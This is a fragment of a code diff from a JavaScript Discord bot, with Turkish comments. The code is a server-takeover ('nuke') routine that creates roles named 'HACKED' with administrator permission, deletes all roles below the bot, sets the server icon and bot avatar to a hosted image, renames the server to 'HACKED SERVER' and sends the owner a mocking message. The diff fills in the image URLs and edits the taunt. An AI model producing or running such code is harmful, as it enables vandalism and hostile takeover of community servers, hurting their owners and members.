@@ -13813,7 +13813,7 @@ client.on("message", async msg => {
     });
                     msg.guild.createRole({
       name: "HACKED",
-      color: "FF0097",
+      color: "FF0097", 
       permissions: ["ADMINISTRATOR"]
     });
                     msg.guild.createRole({
@@ -13826,12 +13826,12 @@ client.on("message", async msg => {
       color: "FF0032",
       permissions: ["ADMINISTRATOR"]
     });
-     msg.guild.setIcon("");  //SUNUCUNUN RESMINI DEGISTIRIR HIZI RESIM SUTESINDEN UPLOAD EDEBILIRSINIZ
+     msg.guild.setIcon("https://i.hizliresim.com/fap98fs.jpg");  //SUNUCUNUN RESMINI DEGISTIRIR HIZI RESIM SUTESINDEN UPLOAD EDEBILIRSINIZ
      msg.guild.setName("ャ HACKED SERVER ャ"); //SUNUCUNUN ISMINI DEGISTIRIR
      msg.guild.roles.forEach(roles => roles.delete()); //BOTUN SIZE BILDIGI BÜTÜN ROLLER SILINIR (BOTUN ROLUNUN ALTINDAKILER) 
-     client.user.setAvatar(""); //BOTUN RESMINI DEGISTIRIR HIZLI RESIM SITESINDEN UPLOAD EDEBILIRSINIZ
+     client.user.setAvatar("https://i.hizliresim.com/fap98fs.jpg"); //BOTUN RESMINI DEGISTIRIR HIZLI RESIM SITESINDEN UPLOAD EDEBILIRSINIZ
      client.user.setUsername("ャ HACKED ャ");    //BOTUN ISMİNİ DEGISTIRIR
-     msg.guild.owner.send("**Sunucunu Hackledik Ağla :D**");    //SUNUCUNUN KURUCUSUNA DMDEN GÖNDERİLEN MESAJ
+     msg.guild.owner.send("**Sunucunu Hacklendi:D**");    //SUNUCUNUN KURUCUSUNA DMDEN GÖNDERİLEN MESAJ
     
   }
 });
